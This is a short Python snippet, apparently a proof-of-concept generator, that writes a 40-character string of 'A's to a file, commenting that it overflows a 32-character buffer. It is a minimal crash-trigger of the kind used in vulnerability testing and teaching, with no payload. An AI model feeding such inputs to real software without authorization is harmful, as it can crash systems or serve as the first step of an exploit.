with open('poc_input.txt', 'w') as f:
    # Write a string longer than 32 characters to trigger the buffer overflow.
    f.write('A' * 40)